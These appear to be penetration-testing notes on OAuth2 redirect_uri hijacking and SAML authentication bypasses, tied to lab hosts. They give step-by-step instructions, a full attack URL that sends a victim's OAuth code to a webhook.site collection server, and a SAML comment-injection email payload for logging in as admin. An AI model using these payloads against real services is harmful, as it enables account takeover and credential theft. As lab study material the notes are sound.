# OAuth2
### OAuth2: Authorization Server/ Client OpenRedirect
When signing in using oauth, the oauth2 client sends the request to the authorization server with the parameters (client_id, redirect_uri,response_type, state). <br/>The Resource Owner gets redirected to the redirect_uri value, as part of the redirect, the Authorization Server adds the following parameters (code, state).<br/> <br/>
If the Authorization Server does not enforce the redirect URL based on client_id parameter, by changing the value the victim will be redirected to the redirect URL with the code as part of the URL.<br/>
The attacker needs to follow these steps:</br>
- Start the OAuth2 "Dance" and intercept the request going to the Authorization using HTTP GET.
- Setup a server where the attacker can access the logs.
- Swap the redirect URL parameter with the attacker's server.
- Get the victim to visit this URL.
- Use the request coming from the victim to finish the OAuth2 "Dance" with the OAuth2 Client (using the same session to keep the valid state).
- Finally Change the value of code with the one obtained from the victim.
<br/><br/>
If redirect_uri value is verified while sending the request try to find a open redirect vulnerability in the application and use that vulnerability to redirect to the attacker server and obtain the code and state parameter values. <br/>
`http://authorization-ptl-21630ca2-af663356.libcurl.so/oauth/authorize?client_id=ed8dcb27c5dd3627375996a8cffdb97df35cfe770ccab11077bc94b140771b2f&redirect_uri=http://ptl-21630ca2-af663356.libcurl.so/redirect?url=https://webhook.site/766a9721-c3a1-4a62-b75f-3871ec56c763&response_type=code&state=4972e7abd2a0b4675b67eaf6428bf393511fe3ee59d72c5d`
<br/>Then you can use those values to login as a victim using the same session. <br/>
![image](https://user-images.githubusercontent.com/30318660/182790088-5fcf64da-587d-4bf0-9ae0-c3e431618d13.png)

# SAML
- If SAML is used to provide Single Sign-On (SSO), check SAML Response and decode the encoded long text and modify the <NameID ...> value and then encode it again finally forward the request. If the signature is not validated in the server the authentication can be bypassed. <br/>
- If signature is validated in the server and shows the error "signature not valid", then try removing signature value from the SAML Response and send the request. <br/>
- SAML Comment Injection: Try registering user with email `admin<!--a-->@libcurl.so` (Trying to login as admin). When SAML login is executed it removes the comment part of the email and will login as admin@libcurl.so <br/>
- 
